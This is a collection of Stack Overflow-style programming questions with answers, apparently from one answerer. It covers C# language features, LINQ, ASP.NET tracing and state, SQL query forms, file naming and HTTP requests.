"<p>I use LINQ in my code all the time.  I've gotten to the point where it just seems so natural to Group, Order, an organize a bunch of objects using the LINQ syntax that I struggle to think how I would do the same things without it.</p>

<p>I had never delved into the SQL-esque world before this, but I imagine many people who learned even the normal SQL syntax suddenly felt constricted by most normal programming languages abilities to wrangle complex object hierarchies?</p>

<p>Am I painting myself into a corner becoming reliant on LINQ to do my more complex tasks?  It just feels so much more expressive than if I wrote plain C# code.</p>

<p>Is becoming dependent on the LINQ syntax in my day-to-day programming going to hurt me in the long run if I end up switching languages or frameworks where something like it isn't available?</p>
","33708","","<p>Does it matter? Every language has its unique nice features. It's like saying ""Will using braces in C# make it hard to transfer it to another non curly brace language?""  </p>
"
"<p>I'm building a tree-based data structure and overloaded [ ] so that I can say</p>

<pre><code>node[""key1"", ""key2"", ""key3""]
</code></pre>

<p>which returns the node whose parents 1, 2, and 3 levels above are the nodes with those keys. the nodes conceptually map to an array of data, so what I have now is this function:</p>

<pre><code>node[keys...].SetValue(i, value)
</code></pre>

<p>which sets the i-th value in the node's data. what would be nice is if I could do this:</p>

<pre><code>node[keys][i] = value
</code></pre>

<p>problem is, node[keys] returns a node, so the [i] indexing tries to get at another node. basically what I want to be able to do is overload ""[ ][ ]"" as an operator, which I can't.</p>

<p>is there any way to get at what I'm trying to do?</p>
","33708","","<p>Note: <strong>This answer talks about implementing something like <code>obj[a][b][c]...</code> that could work with variable number of brackets. It seems it's not exactly what the OP wanted</strong>.</p>

<p>You can't overload that directly. You should return an object with an indexer from the first indexer so that you could simulate this functionality.<br />
It's a bit harder to simulate <code>set</code> but it's possible to do something like:</p>

<pre><code>public class Node&lt;T&gt; {
    public Node&lt;T&gt; this[string key] {
        get { return GetChildNode(key); }
        set {
            if (value is DummyNode&lt;T&gt;) {
                GetChildNode(key).Value = value.Value;
            } else {
                // do something, ignore, throw exception, depending on the problem
            }
        }
    } 
    public static implicit operator T(Node&lt;T&gt; value) {
        return value.Value;
    }
    private class DummyNode&lt;T&gt; : Node&lt;T&gt; {
    }
    public static implicit operator Node&lt;T&gt;(T value) {
        return new DummyNode&lt;T&gt; { Value = value };
    }
    public T Value { get; set; }
}
</code></pre>
"
"<p>I have an ASP.NET application I am working on. One of the requirements of this application is to not use query string parameters. The reason why is that the client feels it appears dirty and unprofessional. In addition, Session variables cannot be used either. In an effort to overcome these challenges, I decided to use hidden html elements with runat=""server"". </p>

<p>The challenge is, the page gets redirected to itself. The reason why is that the page represents a template in a list of 10 pages. If the user clicks ""Next"" the application needs to update the information for the second page. If the user clicks ""Previous"" the opposite needs to happen.</p>

<p>How do I read/set a hidden HTML field such that I can access the values I need on subsequent page requests?</p>

<p>Thank you!</p>
","33708","","<p>ASP.NET uses <a href=""http://msdn.microsoft.com/en-us/library/system.web.ui.losformatter.aspx"" rel=""nofollow""><code>LosFormatter</code> class</a> to serialize the view state. Essentially, you're doing a similar thing. Just store the data you want in an object and serialize it as a hidden form field. Use <code>Request.Form[""...""]</code> to get the value back and deserialize it.</p>
"
"<p>Is there a way to find ILDASM.exe from <a href=""http://en.wikipedia.org/wiki/Microsoft_Visual_Studio#Visual_Studio_2008"" rel=""nofollow"">Visual&nbsp;Studio&nbsp;2008</a>? </p>

<p>I know the location ""C:\Program Files\Microsoft Visual Studio 8\SDK\v2.0\Bin"", but I want it through Visual&nbsp;Studio&nbsp;2008.</p>
","33708","","<p>I'm not sure what you mean by ""wanting it through Visual Studio"", but you can easily add it to the Visual Studio Tools menu with the ""Tools <code>-&gt;</code> External Tools"" dialog.</p>
"
"<p>How to comment multiple lines of code/block of code in VB?</p>
","33708","","<p>VB doesn't have such a construct at the language level. It has single line comments using apostrophe character:</p>

<pre><code>' hello world
' this is a comment
Rem this is also a comment
</code></pre>

<p>However, Visual Studio has a functionality to automate this task. Select the lines you want and press <kbd>Ctrl</kbd>-<kbd>K</kbd>, <kbd>Ctrl</kbd>-<kbd>C</kbd> for commenting and <kbd>Ctrl</kbd>-<kbd>K</kbd>, <kbd>Ctrl</kbd>-<kbd>U</kbd> for uncommenting (General Development Settings shortcuts, look at the ""Edit <code>-&gt;</code> Advanced"" menu while selecting some code to see the shortcuts).</p>
"
"<p>I have a <code>Uri</code> object being passed to a constructor of my class. </p>

<p>I want to open the file the <code>Uri</code> points to, whether it's local, network, http, whatever, and read the contents into a string. Is there an easy way of doing this, or do I have to try to work off things like <code>Uri.IsFile</code> to figure out how to try to open it?</p>
","33708","","<pre><code>static string GetContents(Uri uri) {
    using (var response = WebRequest.Create(uri).GetResponse())
    using (var stream = response.GetResponseStream())
    using (var reader = new StreamReader(stream))
        return reader.ReadToEnd();
}
</code></pre>

<p>It won't work for <strong>whatever</strong>. It works for <code>file://</code>, <code>http://</code> and <code>https://</code> and <code>ftp://</code> by default. However, you can register custom URI handlers with <a href=""http://msdn.microsoft.com/en-us/library/system.net.webrequest.registerprefix.aspx""><code>WebRequest.RegisterPrefix</code></a> to make it work for those as well.</p>
"
"<p>I have a web service that is running on IIS (6 or 7, doesn't matter) and I would like to know the port that the caller has sent their request/invocation from.</p>

<p>So if a client makes a call on my web service, how do I find out from the server side what the port number is they made the call from?</p>

<p>Is that something that even gets passed at even the lowest level? Just to be clear I'm not looking for the port for callback purposes. It's for logging only.</p>
","33708","","<p>TCP sockets do have the concept of sender port number but it doesn't have much use in application level protocols. That said, considering the last paragraph of the OP, I think you're looking for some way to call back the client. The ports I said previously cannot be used for that. Asynchronous requests are identical to synchronous ones running on a separate thread, nothing special about them.</p>
"
"<p>I've got a process which attempts to decode different encodings of strings from a binary stream.  I get some behavior which does not quite add up in my mind when I step through it.  Specifically, what I do is:</p>

<ul>
<li>obtain the maximum number of bytes which would be used to encode a character in the given encoding</li>
<li>grab the amount of bytes from the stream</li>
<li>use <code>Encoding.GetCharCount</code> to determine just how many characters might have been encoded in those bytes (could be 0 one or two...)</li>
<li>if its not zero i use <code>Encoding.GetString</code> to grab the characters out of the byte array</li>
<li>i then figure out how many bytes were used to encode the extracted characters and advance the stream index by that amount</li>
<li>if the number of decodable bytes turns out to be zero i advance the index by one byte and try the whole thing again...in this fashion i expect not to miss any decodable characters</li>
</ul>

<p><em>BTW, if anyone notices any incorrect assumption made in the above, feel free to say so...</em></p>

<p>I have my decoders set to throw <code>DedcoderFallbackExceptions</code> when they cannot decode a given set of bytes.  What confuses me is that some times the exception arises when I call <code>GetCharCount</code> and other times it occurs when I call <code>GetString</code>.  Is there any reason this should be happening?  Is this in fact expected?  I would like to be able to reliably check for the presence of printable characters in as few places as possible - currently I'm doing it in several places.</p>

<p>Any thoughts?</p>

<p>thanks,
brian</p>

<p><strong>BIG UPDATE:</strong>
It seems that my initial description of the problem is lacking a bit.  Let me add a few more premises to the problem:</p>

<ul>
<li>the stream could be <strong><em>extremely</em></strong> large - it <strong><em>will not</em></strong> fit in memory for most users</li>
<li>at any given place in the stream i don't know for sure that I am at the beginning of text, in the middle of text</li>
<li>at any given place in the stream i don't know if i am in the middle or beginning of a multi byte character</li>
<li>the stream will contain much material that is in fact not text of any sort, as well as a smattering of different encodings</li>
</ul>

<p>Hopefully this clarifies some of the issues.  Responses so far have been very helpful!  Please do continue!</p>
","33708","","<p>Encodings like UTF8 use variable number of bytes for characters so you can't simply multiply the maximum number of bytes to fetch from the stream. The last byte might fall at the middle of a character (and might be invalid in isolation) or the last character might represent a completely different character on that specific encoding.</p>
"
"<p>I'm trying to figure out which is faster, a clause like ""WHERE IN (SELECT 1 FROM MyTable)"", or a clause like ""WHERE EXISTS (SELECT 1 FROM MyTable). </p>

<p>Let's use the query from the SqlServer documentation:</p>

<pre><code>SELECT * FROM Orders 
WHERE ShipRegion = 'WA' AND EXISTS (
    SELECT EmployeeID FROM Employees AS Emp 
    WHERE Emp.EmployeeID = Orders.EmployeeID)
</code></pre>

<p>Or</p>

<pre><code>SELECT * FROM Order
WHERE ShipRegion = 'WA' AND EmployeeID IN (
    SELECT EmployeeID FROM Employees AS Emp 
    WHERE Emp.EmployeeID = Orders.EmployeeID)
</code></pre>

<p>I'd like to know the answer, if anyone has it, but I'd really like to know how to test it for myself in SqlServer 2005. (I'm a noob at SqlServer.)</p>

<p>Thanks!</p>
","33708","","<p>You could also remove the <code>WHERE</code> clause in the <code>IN</code> case:</p>

<pre><code>SELECT * FROM Orders
WHERE ShipRegion = 'WA' AND EmployeeID IN (SELECT EmployeeID FROM Employees)
</code></pre>

<p>The query optimizer should be able to generate an identical execution plan for both queries. I'd choose the one that's more readable.</p>
"
"<p>I'm trying to create a byte array whose size is of type long.  For example, think of it as:</p>

<pre><code>long x = _________;
byte[] b = new byte[x];
</code></pre>

<p>Apparently you can only specify an int for the size of a byte array.</p>

<p>Before anyone asks why I would need a byte array so large, I'll say I need to encapsulate data of message formats that I am not writing, and one of these message types has a length of an unsigned int (long in java).</p>

<p>Is there a way to create this byte array?</p>

<p>I am thinking if there's no way around it, I can create a byte array output stream and keep feeding it bytes, but I don't know if there's any restriction on a size of a byte array.</p>

<p>Please let me know.</p>

<p>Thanks,
jbu</p>
","33708","","<p>A <code>byte[]</code> with size of the maximum 32-bit signed integer would require 2GB of contiguous address space. You shouldn't try to create such an array. Otherwise, if the size is not really that large (and it's just a larger type), you could safely cast it to an <code>int</code> and use it to create the array.</p>
"
"<p>I have a program, and in that program there is some variables (username and ""privilege-level"") that are only changed when the user logs on. Is there a way to ""secure"" these varaibles from memory-editing etc while the program runs, but the program is still able to change them if the user logs on with an other username.</p>

<p>I thought it would work (haven't tested) to use either const or readonly, but is it still possible to change them when the user relogs?</p>

<p>Also, is it possible to hash/encrypt strings used in the program, so that the user isn't able to find them by searching the memory (i.e. using Cheat Engine)?</p>
","33708","","<p>There's <strong>no reliable way you could that</strong>. By encrypting the stuff you can just make it harder but never impossible. Worst case, user can attach a debugger and alter the memory directly.</p>
"
"<p>I am trying to send an exception caught in Controller to trace.axd page, but I cant seem to figure it out. 
I have</p>

<pre><code>&lt;trace enabled=""true"" localOnly=""false"" mostRecent=""true"" pageOutput=""false"" /&gt;</code></pre>

<p>in web.config, and my inteded reaction to an exception is</p>

<pre><code>catch (Exception e)
{
    ViewData[""error""] += ""Is not number!"";
    Trace.TraceError(e.ToString());
    Trace.TraceError(e.StackTrace);
    return View();
}
</code></pre>

<p>However, I can't find either of those strings anywhere on trace.axd page. So how to get them there?</p>

<p>Secondary, I want to ask, how should I turn off tracing not problematic (meaning those I do not personally send from some method) requests, since they just flood my trace and remove those occasional error reports sooner, than someone notices them.</p>

<p>Thanks in advance.</p>
","33708","","<p>I <em>guess</em> your problem is that you are using the <code>System.Diagnostics.Trace</code> class instead of ASP.NET's tracing mechanism and it's not set to route trace messages to <code>trace.axd</code>. Try using <code>Controller.HttpContext.Trace</code> object for tracing.</p>

<p>Alternatively, try routing <code>System.Diagnostics.Trace</code> to ASP.NET tracing by adding the following snippet to <code>web.config</code>:</p>

<pre><code>&lt;system.diagnostics&gt;
  &lt;trace&gt;
    &lt;listeners&gt;
       &lt;add name=""WebPageTraceListener"" 
            type=""System.Web.WebPageTraceListener, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt;
    &lt;/listeners&gt;
  &lt;/trace&gt;
&lt;/system.diagnostics&gt;
</code></pre>
"
"<p>We have an old web app written in classic ASP. We don't have the resources to rewrite the app.</p>

<p>I know that asp and aspx pages can coexist in the same ASP.NET web app, but it appears as those you cannot share Application and probably Session variables across these two groups of page extension types.</p>

<p>I was hoping to do new development in ASP.NET and to in theory, convert the Classic ASP pages over as we go. </p>

<p>Is there a way to share IIS variables across these two types of web pages (aside from passing information using the query string and forms fields)?</p>
","33708","","<p>Not a direct way. You could consider using a shared database backend for your session state.</p>
"
"<p>Suppose I have two classes that both contain a static variable, XmlTag. The second class inherits from the first class. I have a template method that needs to obtain the XmlTag depending on the which type it is using. What would be the best way to accomplish this, without having to create an instance of the type? Here is an example(that won't compile), that should hopefully illustrate what I'm talking about.</p>

<pre><code>class A{
public static readonly string XmlTag = ""AClass"";
}

class B : A {
public static readonly string XmlTag = ""BClass"";
}
</code></pre>

<p>This method is currently invalid.. Static variables can't be accessed from Type paramaters apparently.</p>

<pre><code>string GetName&lt;T&gt;(T AClass) where T : A
{
    return T.XmlTag;
}
</code></pre>
","33708","","<p>There's no direct way you could do that without resorting to reflection.</p>

<p>If you <strong>really</strong> want to do that (I encourage you to consider changing your high level design first):</p>

<p>To get a field value:</p>

<pre><code>var returnValue = typeof(T).GetField(""FieldName"").GetValue(null);
</code></pre>

<p>To get a property:</p>

<pre><code>var returnValue = typeof(T).GetProperty(""PropertyName"").GetValue(null, null);
</code></pre>

<p>To invoke a method:</p>

<pre><code>typeof(T).InvokeMember(""MethodName"", BindingFlags.Static | BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.NonPublic, null, null, null);
</code></pre>
"
"<p>I have 2 collections, one of available features and one of user features.  I would like to delete an item in the available features that contain the featurecode in the other collection but can't find the right syntax.</p>

<p>I've included my current code that doesn't compile (it's complaining that I can't use the ""=="" operator, my Linq knowledge is minimal)</p>

<p>Is Linq the best way to do this?  Any help would be appreciated.</p>

<pre><code>        AvailableFeatureViewListClass availableFeatures = (AvailableFeatureViewListClass)uxAvailableList.ItemsSource;
        UserFeatureListClass userFeatures = (UserFeatureListClass)uxUserFeatureList.ItemsSource;

        foreach (UserFeatureClass feature in userFeatures)
        {
            availableFeatures.Remove(availableFeatures.First(FeatureCode =&gt; FeatureCode == feature.FeatureCode));
        }
</code></pre>
","33708","","<p>Use <code>Except</code> method with a custom <code>Equals</code> or <code>IEqualityComparer</code> implementation for your type (the type of your collection item is not really obvious):</p>

<pre><code>var features = availableFeatures.Except(userFeatures, new FeatureCodeComparer());
</code></pre>

<p>If the <code>availableFeatures</code> is just a collection of integers, you'd just do something like:</p>

<pre><code>var features = availableFeatures.Except(userFeatures.Select(x =&gt; x.FeatureCode));
</code></pre>
"
"<p>Is there some sort of C# directive to use when using a development machine (32-bit or 64-bit) that says something to the effect of:</p>

<pre>
if (32-bit Vista)
    // set a property to true
else if (64-bit Vista)
    // set a property to false
</pre>

<p>but I want to do this in Visual Studio as I have an application I'm working on that needs to be tested in 32/64 bit versions of Vista.</p>

<p>Is something like this possible?</p>
","33708","","<p>You can use a <code>#if</code> directive and set the value as a compiler switch (or in the project settings):</p>

<pre><code> #if VISTA64
     ...
 #else
     ...
 #endif
</code></pre>

<p>and compile with:</p>

<pre><code> csc /d:VISTA64 file1.cs
</code></pre>

<p>when compiling a 64 bit build.</p>
"
"<p>Let's say I have the following XML:</p>

<pre><code>&lt;Account&gt;
        &lt;AccountExpirationDate&gt;6/1/2009&lt;/AccountExpirationDate&gt;
&lt;/Account&gt;
</code></pre>

<p>I want to use LINQ to XML to parse this into an object I'll call Account:</p>

<pre><code>public class Account {
    public DateTime? AccountExpirationDate { get; set; }
}
</code></pre>

<p>This is the C# code I've tried, but it won't let me use null:</p>

<pre><code>var accountSettings = 
  from settings in templateXML.Descendants(""Account"")
  select new Account {
      AccountExpirationDate =   
         string.IsNullOrEmpty(settings.Element(""AccountExpirationDate"").Value) 
         ? DateTime.Parse(settings.Element(""AccountExpirationDate"").Value) 
         : null
  };
</code></pre>

<p>Is there a way for me to only assign AccountExpiration a date if the element exists in the XML? In my business logic it is acceptable for the value to be null. Thanks!</p>
","33708","","<pre><code>var accountSettings =
  from settings in templateXML.Descendants(""Account"")
  select new Account {
    AccountExpirationDate = 
      string.IsNullOrEmpty((string)settings.Element(""AccountExpirationDate"")) 
            ? (DateTime?)null
            : DateTime.Parse(settings.Element(""AccountExpirationDate"").Value) 
  };
</code></pre>
"
"<p>What is the difference, if there is one, between a destructor and a Finalize method in a class?</p>

<p>I recently discovered that Visual Studio 2008 considers a destructor synonymous with a Finalize method, meaning that Visual Studio won't let you simultaneously define both methods in a class.</p>

<p>For example, the following code fragment:</p>

<pre><code>class TestFinalize
{
    ~TestFinalize()
    {
        Finalize();
    }

    public bool Finalize()
    {
        return true;
    }
}
</code></pre>

<p>Gives the following error on the call to Finalize in the destructor: </p>

<blockquote>
  <p>The call is ambiguous between the following methods or properties:
          'TestFinalize.~TestFinalize()' and 'TestFinalize.Finalize()'</p>
</blockquote>

<p>And if the call to Finalize is commented out, it gives the following error:</p>

<blockquote>
  <p>Type 'ManagementConcepts.Service.TestFinalize' already defines a member called 
      'Finalize' with the same parameter types</p>
</blockquote>
","33708","","<p>A destructor in C# overrides <code>System.Object.Finalize</code> method. You <strong>have to</strong> use destructor syntax to do so. Manually overriding <code>Finalize</code> will give you an error message. </p>

<p>Basically what you trying to do with your <code>Finalize</code> method declaration is <a href=""http://msdn.microsoft.com/en-us/library/aa691135%28VS.71%29.aspx""><strong>hiding</strong></a> the method of the base class. It will cause the compiler to issue a warning which can be silenced using the <code>new</code> modifier (if it was going to work). The important thing to note here is that you <strong>can't</strong> both <code>override</code> and declare a <code>new</code> member with identical name at the same time so having both a destructor and a <code>Finalize</code> method will result in an error (but you <strong>can</strong>, although not recommended, declare a <code>public new void Finalize()</code> method if you're not declaring a destructor).</p>
"
"<p>I am getting a compile error from the following property. <br>
The error is:</p>

<blockquote>
  <p>""The modifier 'public' is not valid for this item""</p>
</blockquote>

<pre><code>public System.Collections.Specialized.StringDictionary IWorkItemControl.Properties
{
    get { return properties; }
    set { properties = value; }
}
</code></pre>

<p>but if I remove the IWorkItemControl it compiles fine.</p>

<p>Why am I getting this error and what is the difference of having / not having the interface name in the signature?</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/ms173157.aspx"">Explicit interface implementation</a> does not let you specify any access modifiers. When you implement an interface member explicitly (by specifying the interface name before the member name), you can access that member <strong>only using that interface</strong>. Basically, if you do:</p>

<pre><code>System.Collections.Specialized.StringDictionary IWorkItemControl.Properties
{
    get { return properties; }
    set { properties = value; }
}
</code></pre>

<p>You can't do:</p>

<pre><code>MyClass x = new MyClass();
var test = x.Properties; // fails to compile
// You should do:
var test = ((IWorkItemControl)x).Properties; // accessible through the interface
</code></pre>

<p>There are several use cases for EII. For example, you want to provide a <code>Close</code> method for your class to free up acquired resources but you still want to implement <code>IDisposable</code>. You could do:</p>

<pre><code>class Test : IDisposable {
    public void Close() {
        // Frees up resources
    }
    void IDisposable.Dispose() {
        Close();
    }
}
</code></pre>

<p>This way, the consumers of class can only call <code>Close</code> directly (and they won't even see <code>Dispose</code> in Intellisense list) but you can still use the <code>Test</code> class wherever an <code>IDisposable</code> is expected (e.g. in a <code>using</code> statement).</p>

<p>Another use case for EII is providing different implementations of an identically named interface member for two interfaces:</p>

<pre><code>interface IOne {
   bool Property { get; }
}

interface ITwo {
   string Property { get; }
}

class Test : IOne, ITwo {
   bool IOne.Property { ... }
   string ITwo.Property { ... }
}
</code></pre>

<p>As you see, without EII it's <strong>not even possible</strong> to implement both interfaces of this example in a single class (as the properties differ just in return type). In other cases, you might want to intentionally provide different behavior for individual views of a class through different interfaces.</p>
"
"<p>I would like to create a method which takes either a filename as a <code>string</code> or a <code>FileInfo</code> and adds an incremented number to the filename if the file exists. But can't quite wrap my head around how to do this in a good way.</p>

<p>For example, if I have this FileInfo</p>

<pre><code>var file = new FileInfo(@""C:\file.ext"");
</code></pre>

<p>I would like the method to give me a new FileInfo with <em>C:\file 1.ext</em> if <em>C:\file.ext</em>
existed, and <em>C:\file 2.ext</em> if <em>C:\file 1.ext</em> existed and so on. Something like this:</p>

<pre><code>public FileInfo MakeUnique(FileInfo fileInfo)
{
    if(fileInfo == null)
        throw new ArgumentNullException(""fileInfo"");
    if(!fileInfo.Exists)
        return fileInfo;

    // Somehow construct new filename from the one we have, test it, 
    // then do it again if necessary.
}
</code></pre>
","33708","","<pre><code>public FileInfo MakeUnique(string path)
{            
    string dir = Path.GetDirectoryName(path);
    string fileName = Path.GetFileNameWithoutExtension(path);
    string fileExt = Path.GetExtension(path);

    for (int i = 1; ;++i) {
        if (!File.Exists(path))
            return new FileInfo(path);

        path = Path.Combine(dir, fileName + "" "" + i + fileExt);
    }
}
</code></pre>

<p>Obviously, this is vulnerable to race conditions as noted in other answers.</p>
"
"<p>This is my MDI Parent.   </p>

<pre><code>public partial class frmMain : Form
        {
            public Options options {get; set;}
            public Project project {get; set;}


            public frmMain()
            {
                InitializeComponent();


            }
        }
</code></pre>

<p>My MDI child below need to access the project and option.</p>

<pre><code> public partial class frmInput : form
    {

        public frmInput(frmMain parent)
        {
            InitializeComponent();

            this.MdiParent = parent;

            //Of course I can do this
            Options options = ((frmMain) this.MdiParent).options;

           //But if I can have something as following, I can have 
           //a static method to access options in the frmMain anywhere.
           frmMain mainform = Application.MainForm;
           Options options = mainform.options;

        }
    }
</code></pre>

<p>If Application doesn't provide the access to the MdiParent, any other means that we can access it through static method?</p>
","33708","","<p>Why don't you manually create a static field to do so? Something like:</p>

<pre><code>public class frmMain {
    public static frmMain ApplicationMainWindow {get; private set;}
    public frmMain() {
        ApplicationMainWindow = this;
        InitializeComponent();
    }
}
</code></pre>

<p>Other than that <code>Application.OpenForms</code> returns all open forms for the application and you can look it up to find the <code>frmMain</code> instance. It's a less than ideal solution though.</p>
"
"<p>can anyone help, i have problem doing a sort, I thought i had it sorted but appears not to be working.</p>

<p>I have a List which stores the following values </p>

<p>8,6,10,11,7</p>

<p>I also have another List (accessories in my class and it has a propert called accessoryId current the classes are in the order of id which is currenty 6,7,8,10,11)</p>

<p>Hence i need to sort them from 6,7,8,10,11 to the order used from the simple list which is 8,6,10,11,7</p>

<p>I have my icomparable (see below) and i am calling like this - it does enter but something is wrong BECAUSE the list still has all my classes but is still in the order of 6,7,8,10,11</p>

<pre><code>   // accesories is the IList&lt;Accessories&gt; (hence why i am use ToList)
   // and sortOrder is the simple int list list&lt;int&gt;
   accesories.ToList().Sort(new ItemTpComparer(sortOrder));  

class ItemTpComparer : IComparer&lt;Accessories&gt;
{
    private IList&lt;int&gt; otherList;

    public ItemTpComparer(IList&lt;int&gt; otherList)
    {
        this.otherList = otherList;
    }

    #region IComparer&lt;Accessories&gt; Members

    public int Compare(Accessories x, Accessories y)
    {

        if (otherList.IndexOf(x.AccessoryId) &gt; otherList.IndexOf(y.AccessoryId))
            return 1;

        else if (otherList.IndexOf(x.AccessoryId) &lt; otherList.IndexOf(y.AccessoryId))
            return -1;
        else
            return 0;

        // tried below also didn't work
        //return otherList.IndexOf(x.AccessoryId) - otherList.IndexOf(y.AccessoryId);
</code></pre>
","33708","","<p>The comparer is correct (even the commented single line version). The problem is <code>ToList()</code> creates a new <code>List</code> containing a copy of elements in the <code>IEnumerable&lt;T&gt;</code> object so basically, you are creating a new list, sorting it and throwing it away.</p>

<pre><code>var sortedList = accesories.ToList();
sortedList.Sort(new ItemTpComparer(sortOrder)); 
</code></pre>

<p>for which I'd suggest replacing with:</p>

<pre><code>var sortedList = accessories.OrderBy(sortOrder.IndexOf).ToList();
</code></pre>

<p>this way, no comparer implementation would be necessary. You could also sort in the descending order easily:</p>

<pre><code>var sortedList = accessories.OrderByDescending(sortOrder.IndexOf).ToList();
</code></pre>

<p>If the object is really <code>List&lt;Accessories&gt;</code>, you could also sort it in place:</p>

<pre><code>((List&lt;Accessories&gt;)accessories).Sort(new ItemTpComparer(sortOrder));
</code></pre>
"
"<p>In some of my tests i need to check the order of Lists and do it something like this</p>

<pre><code>DateTime lastDate = new DateTime(2009, 10, 1);
foreach (DueAssigmentViewModel assignment in _dueAssigments)
{
    if (assignment.DueDate &lt; lastDate)
    {
        Assert.Fail(""Not Correctly Ordered"");
    }
    lastDate = assignment.DueDate;
}
</code></pre>

<p>What i would like to do i turn this into an extension method on IEnumerable to make it reusable.</p>

<p>My inital idea was this</p>

<pre><code>public static bool IsOrderedBy&lt;T, TestType&gt;(this IEnumerable&lt;T&gt; value, TestType initalValue)
{
    TestType lastValue = initalValue;
    foreach (T enumerable in value)
    {
        if(enumerable &lt; lastValue)
        {
            return false;
        }
        lastValue = value;
    }
    return true;
}
</code></pre>

<p>The ovious problem here is you cant compaire to generic values. Can anyone suggest a way round this.</p>

<p>Cheers
Colin</p>
","33708","","<p>You should do something like this (I can't see why <code>TestType</code> should be different from <code>T</code>):</p>

<pre><code>public static bool IsOrderedBy&lt;T&gt;(this IEnumerable&lt;T&gt; value, T initalValue)
      where T : IComparable&lt;T&gt; {

      var currentValue = initialValue;

      foreach(var i in value) {
           if (i.CompareTo(currentValue) &lt; 0)
                return false;
           currentValue = i;
      }

      return true;
}
</code></pre>
"
"<p>How can i get the string within a parenthesis with a custom function?</p>

<p>e.x. the string ""GREECE (+30)"" should return ""+30"" only</p>
","33708","","<p>For the general problem, I'd suggest using <code>Regex</code>. However, if you are sure about the format of the input string (only one set of parens, open paren before close paren), this would work:</p>

<pre><code>int startIndex = s.IndexOf('(') + 1;
string result = s.Substring(startIndex, s.LastIndexOf(')') - startIndex);
</code></pre>
"
"<p>I want to temporary store some mapping data. The mapping is one to one. I saw this was solved in Python by wrapping two dictionaries in one class. In this case the O for  getting mapped value would be O(1). I wan't the same thing. Does .Net already have such structure or I have to implement my own with two dictionaries?</p>
","33708","","<p>You have to implement it using two dictionaries. There's no built-in type in the base class library that efficiently supports indexing both by key and value.</p>
"
"<p>I have the very common problem of creating an index for an in-disk array of strings. In short, I need to store the position of each string in the in-disk representation. For example, a very naive solution would be an index array as follows:</p>

<p>uint64 idx[] = { 0, 20, 500, 1024, ..., 103434 };</p>

<p>Which says that the first string is at position 0, the second at position 20, the third at position 500 and the nth at position 103434.</p>

<p>The positions are always non-negative 64 bits integers in sequential order. Although the numbers could vary by any difference, in practice I expect the typical difference to be inside the range from 2^8 to 2^20. I expect this index to be mmap'ed in memory, and the positions will be accessed randomly (assume uniform distribution).</p>

<p>I was thinking about writing my own code for doing some sort of block delta encoding or other more sophisticated encoding, but there are so many different trade-offs between encoding/decoding speed and space that I would rather get a working library as a starting point and maybe even settle for something without any customizations.</p>

<p>Any hints? A c library would be ideal, but a c++ one would also allow me to run some initial benchmarks.</p>

<p>A few more details if you are still following. This will be used to build a library similar to cdb (<a href=""http://cr.yp.to/cdb/cdbmake.html"">http://cr.yp.to/cdb/cdbmake.html</a>) on top the library cmph (<a href=""http://cmph.sf.net"">http://cmph.sf.net</a>). In short, it is for a large disk based read only associative map with a small index in memory.</p>

<p>Since it is a library, I don't have control over input, but the typical use case that I want to optimize have millions of hundreds of values, average value size in the few kilobytes ranges and maximum value at 2^31.</p>

<p>For the record, if I don't find a library ready to use I intend to implement delta encoding in blocks of 64 integers with the initial bytes specifying the block offset so far. The blocks themselves would be indexed with a tree, giving me O(log (n/64)) access time. There are way too many other options and I would prefer to not discuss them. I am really looking forward ready to use code rather than ideas on how to implement the encoding. I will be glad to share with everyone what I did once I have it working.</p>

<p>I appreciate your help and let me know if you have any doubts.</p>
","33708","","<p>You have two conflicting requirements: </p>

<ol>
<li>You want to compress very small items (8 bytes each).  </li>
<li>You need efficient random access for each item.</li>
</ol>

<p>The second requirement is very likely to impose a fixed length for each item.</p>
"
"<p>I'm reading CJ Date's <a href=""http://oreilly.com/catalog/9780596523060/"" rel=""nofollow""><em>SQL and Relational Theory: How to Write Accurate SQL Code</em></a>, and he makes the case that positional queries are bad &mdash; for example, this <code>INSERT</code>:</p>

<pre><code>INSERT INTO t VALUES (1, 2, 3)
</code></pre>

<p>Instead, you should use attribute-based queries like this:</p>

<pre><code>INSERT INTO t (one, two, three) VALUES (1, 2, 3)
</code></pre>

<p>Now, I understand that the first query is out of line with the relational model since tuples (rows) are unordered sets of attributes (columns).  I'm having trouble understanding where the harm is in the first query.  Can someone explain this to me?</p>
","33708","","<p>I don't really care about theoretical concepts in this regard (as in practice, a table <strong>does have</strong> a defined column order). The primary reason I would prefer the second one to the first is an <strong>added layer of abstraction</strong>. You can modify columns in a table without screwing up your queries.</p>
"
"<p>I'm trying to understand about nested classes in C#.  I understand that a nested class is a class that is defined within another class, what I don't get is why I would ever need to do this.</p>
","33708","","<p>A nested class can have <code>private</code>, <code>protected</code> and <code>protected internal</code> access modifiers along with <code>public</code> and <code>internal</code>. </p>

<p>For example, you are implementing the <code>GetEnumerator()</code> method that returns an <code>IEnumerator&lt;T&gt;</code> object. The consumers wouldn't care about the actual type of the object. All they know about it is that it implements that interface. The class you want to return doesn't have any direct use. You can declare that class as a <code>private</code> nested class and return an instance of it (this is actually how the C# compiler implements iterators):</p>

<pre><code>class MyUselessList : IEnumerable&lt;int&gt; {
    // ...
    private List&lt;int&gt; internalList;
    private class UselessListEnumerator : IEnumerator&lt;int&gt; {
        private MyUselessList obj;
        public UselessListEnumerator(MyUselessList o) {
           obj = o;
        }
        private int currentIndex = -1;
        public int Current {
           get { return obj.internalList[currentIndex]; }
        }
        public bool MoveNext() { 
           return ++currentIndex &lt; obj.internalList.Count;
        }
    }
    public IEnumerator&lt;int&gt; GetEnumerator() {
        return new UselessListEnumerator(this);
    }
}
</code></pre>
"
"<p>How to post the following HTTP requests in C#</p>

<pre><code>POST http://10.0.0.1/st_poe.cgi

Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
Referer: http://10.0.0.1/RST_st_poe.htm
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Host: 10.0.0.1
Content-Length: 21
Connection: Keep-Alive
Pragma: no-cache
Authorization: Basic YWStaW47c3Jsa3NobQ==

ConMethod=++Connect++
</code></pre>

